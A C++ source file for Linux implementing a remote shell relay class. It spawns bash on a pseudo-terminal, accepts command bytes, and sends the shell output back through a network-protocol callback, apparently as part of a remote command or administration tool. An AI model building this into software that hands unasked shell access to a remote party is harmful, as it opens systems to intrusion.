#include "cshell_util_linux.h"
#include <sys/signal.h>
#include <unistd.h>
#include <pty.h>
#include "trans_protocol.h"

CShellUtil::CShellUtil()
{
    m_thd_shell = new std::thread(create_shell,this);
    m_thd_shell->detach();
}

CShellUtil::~CShellUtil()
{
    m_running = 0;
    if (m_pid > 0)
    {
        kill(m_pid, 9);
        printf("[!]shell pid:%d\n", m_pid);
    }
    close(m_master);

    usleep(10);
    delete m_thd_shell;
}

int CShellUtil::write_shell_cmd(char* data, int size)
{
    return write(m_master, data, size);
}

void CShellUtil::create_shell(void* param)
{
    CShellUtil* p_this = (CShellUtil*)param;

    struct termios terminal;
    signal(SIGCHLD, SIG_IGN);

    //创建终端
    p_this->m_pid = forkpty(&p_this->m_master, NULL, NULL, NULL);

    //失败
    if (p_this->m_pid < 0)
    {
        fprintf(stderr, "[x] Error: could not forkpty");
    }
    else if (p_this->m_pid == 0)
    {
        //切换工作目录
        chdir("/");

        // child process
        execl("/bin/bash", "bash", NULL);

        exit(0);
    }
    else
    {
        printf("[!]shell pid:%d\n", p_this->m_pid);

        // father process
        tcgetattr(p_this->m_master, &terminal);
        terminal.c_lflag &= ~ECHO;
        tcsetattr(p_this->m_master, TCSANOW, &terminal);
        
        char buff[8096] = { 0 };
        while (p_this->m_running)
        {
            //读取执行结果
            int read_size = read(p_this->m_master, buff, sizeof(buff));
            if (read_size <= 0)
            {
                break;
            }
            else
            {
                //发送结果
                if (p_this->m_send_cb != nullptr)
                {
                    p_this->m_send_cb(SERVER_REP_RESULT, buff, read_size);
                }
                printf("[!]shell result:%s\n", buff);
            }
        }
    }
}
